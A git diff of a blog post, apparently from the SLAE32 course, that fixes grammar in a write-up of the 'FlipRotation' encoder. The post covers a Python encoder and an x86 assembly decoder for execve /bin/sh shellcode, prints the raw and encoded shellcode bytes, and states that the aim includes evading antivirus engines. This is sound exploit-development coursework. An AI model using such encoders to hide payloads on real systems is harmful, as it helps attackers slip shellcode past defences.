@@ -7,9 +7,10 @@
 <meta name="robots" content="index, follow">
 <title>SLAE32 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder) | nibbles</title>
 <meta name="keywords" content="slae32">
-<meta name="description" content="This post introduces the forth mission to my SLAE32 journey.
-A really really handful and challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode
-Introduction The forth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. AS ou may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).">
+<meta name="description" content="This post introduces the forth mission of my SLAE32 journey.
+A real handful and a challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode
+Introduction The fourth assignment goal was to create my custom encoder and decoder of the execve stack shellcode. As you may know, the purpose is to execute /bin/sh.
+A shellcode encoder can be used for different purposes, mainly making it harder to detect by AV engines or simply avoiding bad characters (such as null bytes).">
 <meta name="author" content="nibbles">
 <link rel="canonical" href="https://0xnibbles.github.io/posts/slae32/slae_32_assignment_4/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css" integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as="style">
@@ -59,9 +60,10 @@ Introduction The forth assignment goal was to create my own custom encoder and d
 
     </style>
 </noscript><meta property="og:title" content="SLAE32 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)" />
-<meta property="og:description" content="This post introduces the forth mission to my SLAE32 journey.
-A really really handful and challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode
-Introduction The forth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. AS ou may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes)." />
+<meta property="og:description" content="This post introduces the forth mission of my SLAE32 journey.
+A real handful and a challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode
+Introduction The fourth assignment goal was to create my custom encoder and decoder of the execve stack shellcode. As you may know, the purpose is to execute /bin/sh.
+A shellcode encoder can be used for different purposes, mainly making it harder to detect by AV engines or simply avoiding bad characters (such as null bytes)." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://0xnibbles.github.io/posts/slae32/slae_32_assignment_4/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-12-28T16:39:09+00:00" />
@@ -69,9 +71,10 @@ Introduction The forth assignment goal was to create my own custom encoder and d
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="SLAE32 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)"/>
-<meta name="twitter:description" content="This post introduces the forth mission to my SLAE32 journey.
-A really really handful and challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode
-Introduction The forth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. AS ou may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes)."/>
+<meta name="twitter:description" content="This post introduces the forth mission of my SLAE32 journey.
+A real handful and a challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode
+Introduction The fourth assignment goal was to create my custom encoder and decoder of the execve stack shellcode. As you may know, the purpose is to execute /bin/sh.
+A shellcode encoder can be used for different purposes, mainly making it harder to detect by AV engines or simply avoiding bad characters (such as null bytes)."/>
 
 
 <script type="application/ld+json">
@@ -100,12 +103,12 @@ Introduction The forth assignment goal was to create my own custom encoder and d
   "@type": "BlogPosting",
   "headline": "SLAE32 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)",
   "name": "SLAE32 Assignment 4 - Custom Encoder\/Decoder Shellcode (FlipRotation Encoder\/Decoder)",
-  "description": "This post introduces the forth mission to my SLAE32 journey.\nA really really handful and challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode\nIntroduction The forth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. AS ou may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).",
+  "description": "This post introduces the forth mission of my SLAE32 journey.\nA real handful and a challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode\nIntroduction The fourth assignment goal was to create my custom encoder and decoder of the execve stack shellcode. As you may know, the purpose is to execute /bin/sh.\nA shellcode encoder can be used for different purposes, mainly making it harder to detect by AV engines or simply avoiding bad characters (such as null bytes).",
   "keywords": [
     "slae32"
   ],
-  "articleBody": " This post introduces the forth mission to my SLAE32 journey.\nA really really handful and challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode\nIntroduction The forth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. AS ou may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).\nFlipRotation Algorithm Overview The inspiration for this algorithm was the known CBC bit-flipping attack but appliyng a simple variation to our context.\nMore specifically, the steps are\nWe pick each shelcode byte and flip the last bit using a xor operation - flipped_shellbyte = shellbyte ^ 0x01 Based on that output the rotation direction is defined. We rotate right if odd or left if even. The number of rotation positions is defined by the loop index value (number of interations) of the loop at that time. If we rotate right we append 0x2 afther the encoded byte and if we rotate left we append 0xff Put the byte 0xa0 as the shellcode end marker The follwoing diagram can help to understand better this process.\nRegarding decoding, it is just simply reverting the steps and we have our original shellcode back.\nFrom my experience developing the decoder in assembly was much simpler than implementing the encoder login in Python.\nEncoder The FlipRotation encoder was developed in Python language. The Encoder class supports various encoding modes but we will focused only in insertion mode.\nFlipRotation Encoder #!/usr/bin/python3 # # The FlipRotation Shellcode encoder # # Rotates back and flips the lowest bit of each byte. # import argparse import secrets import logging import sys secretsGenerator = secrets.SystemRandom() c_style_shellcode = (b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\") # bin/sh def banner(): print(''' _______________________________________________________________ ",
-  "wordCount" : "2617",
+  "articleBody": " This post introduces the forth mission of my SLAE32 journey.\nA real handful and a challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode\nIntroduction The fourth assignment goal was to create my custom encoder and decoder of the execve stack shellcode. As you may know, the purpose is to execute /bin/sh.\nA shellcode encoder can be used for different purposes, mainly making it harder to detect by AV engines or simply avoiding bad characters (such as null bytes).\nFlipRotation Algorithm Overview The inspiration for this algorithm was the known CBC bit-flipping attack but applying a simple variation to our context.\nMore specifically, the steps are\nWe pick each shellcode byte and flip the last bit using a xor operation - flipped_shellbyte = shellbyte ^ 0x01 Based on that output the rotation direction is defined. We rotate right if odd or left if even. The number of rotation positions is defined by the loop index value (number of iterations) of the loop at that time. If we rotate right, we append 0x2 afther the encoded byte, and if we rotate left we append 0xff Put the byte 0xa0 as the shellcode end marker The following diagram can help to understand this process better.\nRegarding decoding, it is just simply reverting the steps, and we have our original shellcode back.\nFrom my experience, developing the decoder in assembly was much more straightforward than implementing the encoder login in Python.\nEncoder The FlipRotation encoder was developed in Python language. The Encoder class supports various encoding modes, but we will focus only on the insertion mode.\nFlipRotation Encoder #!/usr/bin/python3 # # The FlipRotation Shellcode encoder # # Rotates back and flips the lowest bit of each byte. # import argparse import secrets import logging import sys secretsGenerator = secrets.SystemRandom() c_style_shellcode = (b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\") # bin/sh def banner(): print(''' _______________________________________________________________ ",
+  "wordCount" : "2613",
   "inLanguage": "en",
   "datePublished": "2022-12-28T16:39:09Z",
   "dateModified": "2022-12-28T16:39:09Z",
@@ -253,28 +256,28 @@ Introduction The forth assignment goal was to create my own custom encoder and d
 
   <div class="post-content"><p><img loading="lazy" src="/slae32/slae32.png#center" alt="SLAE32"  title="SLAE32"  />
 </p>
-<p>This post introduces the forth mission to my SLAE32 journey.</p>
-<p>A really really handful and challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as <code>FlipRotation Shellcode</code></p>
+<p>This post introduces the forth mission of my SLAE32 journey.</p>
+<p>A real handful and a challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as <code>FlipRotation Shellcode</code></p>
 <h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
-<p>The forth assignment goal was to create my own custom encoder and decoder of the <code>execve stack shellcode</code>. AS ou may know, the purpose is to execute <code>/bin/sh</code>
- 
-A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).</p>
+<p>The fourth assignment goal was to create my custom encoder and decoder of the <code>execve stack shellcode</code>. As you may know, the purpose is to execute <code>/bin/sh</code>.</p>
+<p> 
+A shellcode encoder can be used for different purposes, mainly making it harder to detect by AV engines or simply avoiding bad characters (such as null bytes).</p>
 <h2 id="fliprotation-algorithm-overview">FlipRotation Algorithm Overview<a hidden class="anchor" aria-hidden="true" href="#fliprotation-algorithm-overview">#</a></h2>
-<p>The inspiration for this algorithm was the known <code>CBC bit-flipping attack</code> but appliyng a simple variation to our context.</p>
+<p>The inspiration for this algorithm was the known <code>CBC bit-flipping attack</code> but applying a simple variation to our context.</p>
 <p>More specifically, the steps are</p>
 <ol>
-<li>We pick each shelcode byte and flip the last bit using a <code>xor</code> operation - <code>flipped_shellbyte = shellbyte ^ 0x01</code></li>
-<li>Based on that output the rotation direction is defined. We rotate right if odd or left if even. The number of rotation positions is defined by the loop index value (number of interations) of the loop at that time.</li>
-<li>If we rotate right we append <code>0x2</code> afther the encoded byte and if we rotate left we append <code>0xff</code></li>
+<li>We pick each shellcode byte and flip the last bit using a <code>xor</code> operation - <code>flipped_shellbyte = shellbyte ^ 0x01</code></li>
+<li>Based on that output the rotation direction is defined. We rotate right if odd or left if even. The number of rotation positions is defined by the loop index value (number of iterations) of the loop at that time.</li>
+<li>If we rotate right, we append <code>0x2</code> afther the encoded byte, and if we rotate left we append <code>0xff</code></li>
 <li>Put the byte <code>0xa0</code> as the shellcode end marker</li>
 </ol>
-<p>The follwoing diagram can help to understand better this process.</p>
+<p>The following diagram can help to understand this process better.</p>
 <p><img loading="lazy" src="/slae32/4/fliprotation.jpg#center" alt="FlipRotation"  title="FlipRotation"  />
 </p>
-<p>Regarding decoding, it is just simply reverting the steps and we have our original shellcode back.</p>
-<p>From my experience developing the decoder in assembly was much simpler than implementing the encoder login in Python.</p>
+<p>Regarding decoding, it is just simply reverting the steps, and we have our original shellcode back.</p>
+<p>From my experience, developing the decoder in assembly was much more straightforward than implementing the encoder login in Python.</p>
 <h3 id="encoder">Encoder<a hidden class="anchor" aria-hidden="true" href="#encoder">#</a></h3>
-<p>The FlipRotation encoder was developed in Python language. The <code>Encoder</code> class supports various encoding modes but we will focused only in <code>insertion</code> mode.</p>
+<p>The FlipRotation encoder was developed in Python language. The <code>Encoder</code> class supports various encoding modes, but we will focus only on the <code>insertion</code> mode.</p>
 <h4 id="fliprotation-encoder">FlipRotation Encoder<a hidden class="anchor" aria-hidden="true" href="#fliprotation-encoder">#</a></h4>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
@@ -426,7 +429,7 @@ A shellcode encoder can be used for different purposes mainly make it harder to 
 </span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;--------------------&#34;</span>)
 </span></span><span style="display:flex;"><span>    print()
 </span></span><span style="display:flex;"><span>    print()
-</span></span></code></pre></div><p>The <code>Encoder</code> class is is able to generate a pseudorandom key or use one provided by the user.</p>
+</span></span></code></pre></div><p>The <code>Encoder</code> class can generate a pseudorandom key or use one provided by the user.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">randomKeyGenerator</span>(self):
 </span></span><span style="display:flex;"><span>        byte <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0x&#39;</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>):
@@ -450,7 +453,7 @@ A shellcode encoder can be used for different purposes mainly make it harder to 
 </span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>key <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>randomKeyGenerator()
 </span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;[*] Doing magic with a (pseudo) Random key&#34;</span>)
 </span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[*] Key: &#34;</span><span style="color:#f92672">+</span>hex(self<span style="color:#f92672">.</span>key))
-</span></span></code></pre></div><p>Then, we can call the function <code>insertion_encode</code> and provide the target shellcode as argument.</p>
+</span></span></code></pre></div><p>Then, we can call the function <code>insertion_encode</code> and provide the target shellcode as an argument.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>encoder <span style="color:#f92672">=</span> Encoder(enc_type, key)    <span style="color:#75715e"># providing a key with insertion encoding type</span>
 </span></span><span style="display:flex;"><span>encoder<span style="color:#f92672">.</span>insertion_encode(shellcode) <span style="color:#75715e"># call insertion code with target shellcode as argument</span>
 </span></span></code></pre></div><p>The <code>insertion_encode</code> function is defined as follows:</p>
@@ -490,10 +493,10 @@ A shellcode encoder can be used for different purposes mainly make it harder to 
 </span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[*] 0x format: &#34;</span>)
 </span></span><span style="display:flex;"><span>        encoded <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;0x&#39;</span> <span style="color:#f92672">+</span> hex(self<span style="color:#f92672">.</span>key)[<span style="color:#ae81ff">2</span>:] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;,&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;0x&#39;</span> <span style="color:#f92672">+</span> hex(self<span style="color:#f92672">.</span>key)[<span style="color:#ae81ff">2</span>:] <span style="color:#75715e">#add marker</span>
 </span></span><span style="display:flex;"><span>        print(encoded)
-</span></span></code></pre></div><p>We started by interating each shellcode byte and flipping the least significant bit - <code>flipped_shellbyte</code></p>
-<p>After that, checking that same bit for parity. if it is <code>1</code> is odd but if is <code>0</code> is even. An odd number will rotate right and an even rotate left. Before proceeeding to the rotation we convert the byte to binary in order to have a more robust rotation. The <code>rotation_counter</code> is used as a reference for the number of rotated bits.</p>
-<p>Also as each byte has 8 bits in size, the rotation is performed according to a circular shift methodology by using the modulus <code>%</code> operator. Using the remainder we stick to rotate only a maximum of 7 bits each time.</p>
-<p>After performing the rotation and convert the binary number to hexadecimal the encoding is completed - <code>final_shellbyte</code>. We can append it to the variables where the shellcode is being stored <code>encoded</code> and <code>encoded2</code> followed by the <code>rotation_direction</code> (0x02 or 0xfff).</p>
+</span></span></code></pre></div><p>We started by iterating each shellcode byte and flipping the least significant bit - <code>flipped_shellbyte</code></p>
+<p>The <code>rotation_counter</code>  is used as a reference for the number of rotated bits. After that, check that same bit for parity. If it is <code>1</code> is odd, but if it is <code>0</code> is even.  An odd number will rotate right,, and an even number will rotate left. Before proceeding to the rotation, we convert the byte to binary for a more robust rotation.</p>
+<p>Also, as each byte has 8 bits in size, the rotation is performed according to a circular shift methodology using the modulus <code>%</code> operator. Using the remainder, we stick to rotating only to a maximum of 7 bits each time.</p>
+<p>After performing the rotation and converting the binary number to hexadecimal, the encoding is completed - <code>final_shellbyte</code>. We can append it to the variables where the shellcode is being stored <code>encoded</code> and <code>encoded2</code> followed by the <code>rotation_direction</code> (0x02 or 0xfff).</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> bin(flipped_shellbyte)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0&#39;</span>:
 </span></span><span style="display:flex;"><span>    logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Flipped byte - odd - &#34;</span><span style="color:#f92672">+</span>str(flipped_shellbyte))
 </span></span><span style="display:flex;"><span>    rotated_shellbyte <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>rightRotate(format(flipped_shellbyte,<span style="color:#e6db74">&#39;08b&#39;</span>),rotation_counter<span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span> ) <span style="color:#75715e"># 8 because we are rotating with 8 bits</span>
@@ -510,7 +513,7 @@ A shellcode encoder can be used for different purposes mainly make it harder to 
 </span></span><span style="display:flex;"><span>encoded <span style="color:#f92672">+=</span> final_shellbyte <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;,&#39;</span> <span style="color:#f92672">+</span> rotation_direction <span style="color:#f92672">+</span><span style="color:#e6db74">&#39;,&#39;</span>  <span style="color:#75715e"># \x format</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>encoded2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#39;</span> <span style="color:#f92672">+</span> final_shellbyte[<span style="color:#ae81ff">2</span>:] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#39;</span> <span style="color:#f92672">+</span> rotation_direction[<span style="color:#ae81ff">2</span>:] <span style="color:#75715e"># \x format</span>
-</span></span></code></pre></div><p>The last part, we add the end marker at the end for each shellcode format</p>
+</span></span></code></pre></div><p>We add the end marker for each shellcode format in the last part.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[*] </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x format: &#34;</span>)
 </span></span><span style="display:flex;"><span>encoded2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#39;</span> <span style="color:#f92672">+</span> hex(self<span style="color:#f92672">.</span>key)[<span style="color:#ae81ff">2</span>:]   <span style="color:#75715e"># add marker</span>
 </span></span><span style="display:flex;"><span>print(encoded2)
@@ -560,10 +563,10 @@ A shellcode encoder can be used for different purposes mainly make it harder to 
 </span></span><span style="display:flex;"><span>--------------------
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
 </span></span><span style="display:flex;"><span>--------------------
-</span></span></code></pre></div><p>We have the encoded shellcode already with rotatio direction for each byte and the end marker.</p>
+</span></span></code></pre></div><p>We have the encoded shellcode already with rotation direction for each byte and the end marker.</p>
 <h3 id="decoder">Decoder<a hidden class="anchor" aria-hidden="true" href="#decoder">#</a></h3>
-<p>I said before that it was simpler than the encoder but it was not easy at all. I needed to use a piece of paper and a pencil to develop the logic to decode the payload in assembly.</p>
-<p>Let&rsquo;s dig into the assembly</p>
+<p>I said before that it was more straightforward than the encoder, but it was not easy. I needed to use a piece of paper and a pencil to develop the logic to decode the payload in assembly.</p>
+<p>Let’s dig into the assembly.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; Student ID   : PA-31319
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">; Student Name : Eduardo Silva
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">; Assignment 4 : Custom Encoder/Decoder Shellcode (Linux/x86) Assembly - FlipRotation Encoder
@@ -632,8 +635,8 @@ A shellcode encoder can be used for different purposes mainly make it harder to 
 </span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">call</span> <span style="color:#66d9ef">decoder</span>
 </span></span><span style="display:flex;"><span>	EncodedShellcode: <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x4b</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xe2</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x71</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xb4</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x69</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x17</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x8d</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xd</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xf6</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xa8</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xc7</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x94</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x11</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xe</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x36</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x28</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x99</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x81</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xa0</span>,<span style="color:#ae81ff">0xa0</span> 	<span style="color:#75715e">; 0xa0 is the stop marker
 </span></span></span></code></pre></div><h5 id="divide-and-conquer-the-fliprotation-decoder">Divide and Conquer the FlipRotation Decoder<a hidden class="anchor" aria-hidden="true" href="#divide-and-conquer-the-fliprotation-decoder">#</a></h5>
-<p>This decoder use the <code>jmp-call-pop</code> technique to push the address of the encoded shellcode on the stack and redirect control flow to <code>decoder</code> branch. Then, the address is stored in <code>esi</code></p>
-<p>We use <code>eax</code> to keep track the each parity byte and <code>edx</code> to control the offset from the beginning of the shellcode.</p>
+<p>This decoder uses the <code>jmp-call-pop</code> technique to push the address of the encoded shellcode on the stack and redirect control flow to the <code>decoder</code> branch. Then, the address is stored in <code>esi</code></p>
+<p>We use <code>eax</code> to track each parity byte and <code>edx</code> to control the offset from the beginning of the shellcode.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>decoder:
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">esi</span>
@@ -643,9 +646,9 @@ A shellcode encoder can be used for different purposes mainly make it harder to 
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>,	<span style="color:#ae81ff">1</span>           <span style="color:#75715e">; first parity byte
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">ecx</span>        <span style="color:#75715e">; loop index and number of rotation bits
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">ebx</span>
-</span></span></code></pre></div><p>After this, we have our <code>decoder</code> branch which has the logic to decode the encoded shellcode. It start by moving the parity byte and checking with <code>xor bl, 0xa0</code> if matches the end marker. If yes, it means the shellcode is alrady decoded and redirects execution flow to its first instruction.</p>
-<p>The result of this <code>xor</code> operation using the parity byte will be used below with the operation <code>xor bl, 0x5f</code> to verify if associated shellcode byte is odd or even.</p>
-<p>We know because if we have a even shellcode byte, its parity is <code>0xff</code> and results in <code>0xa0 ^ 0xff = 0x5f</code> which si stored in <code>bl</code>. Then doing <code>xor bl, 0x5f</code> will set <code>ZF</code> (zero flag) to 1. Based on the zero flag value, we know if the shellcode byte is even or odd.</p>
+</span></span></code></pre></div><p>After this, we have our <code>decoder</code> branch, which has the logic to decode the encoded shellcode. It starts by moving the parity byte and checking with <code>xor bl, 0xa0</code> if it matches the end marker. If yes, it the shellcode is decoded and redirects the execution flow to its first instruction.</p>
+<p>The result of this <code>xor</code> operation using the parity byte will be used below with the operation <code>xor bl, 0x5f</code> to verify if the associated shellcode byte is odd or even.</p>
+<p>We know because if we have an even shellcode byte, its parity is <code>0xff</code> and results in <code>0xa0 ^ 0xff = 0x5f</code>, which si stored in <code>bl</code>. Then doing <code>xor bl, 0x5f</code> will set <code>ZF</code> (zero flag) to 1. We know if the shellcode byte is even or odd based on the zero flag value.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>decode:
 </span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">eax</span>]	<span style="color:#75715e">; mov parity byte to bl
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">bl</span>, <span style="color:#ae81ff">0xa0</span>				<span style="color:#75715e">; check if reached the end marker | 0xa0 ^ 0xff = 0x5f
@@ -654,7 +657,7 @@ A shellcode encoder can be used for different purposes mainly make it harder to 
 </span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">bl</span>, <span style="color:#ae81ff">0x5f</span>	<span style="color:#75715e">; if equal, parity is even (0xff) and sets ZF
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">edx</span>] 
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">jnz</span> <span style="color:#66d9ef">odd</span>
-</span></span></code></pre></div><p>The next couple of isntruction are straighforward. We just to rotate in the oposite way that was performed by the encoder according to the byte parity and bit flipping the least significant bit.</p>
+</span></span></code></pre></div><p>The next couple of instructions are straightforward. We rotate in the opposite way that was performed by the encoder according to the byte parity and bit, flipping the least significant bit.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>even:	<span style="color:#75715e">; rotate right
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">ror</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">cl</span>
 </span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">bitFlip</span>
@@ -664,16 +667,16 @@ A shellcode encoder can be used for different purposes mainly make it harder to 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>bitFlip:
 </span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">bl</span>, <span style="color:#ae81ff">0x01</span>
-</span></span></code></pre></div><p>At this stage, the tricky is already done. We just to replace the encoded shellcode byte for the original one using <code>edx</code> as offset. Then, we move to <code>bl</code> the next encoded byte.</p>
-<p>We cant forget to remove the last used parity byte from the encoded shellcode. In the <code>decode</code> branch we set up <code>edi</code> to point the address of the first parity byte. To remove this byte, we can make the next encoded shellcode byte to take its place. In practical terms, we copy the next encoded byte to the address of the last parity byte with the instruction <code>mov byte [edi], bl</code></p>
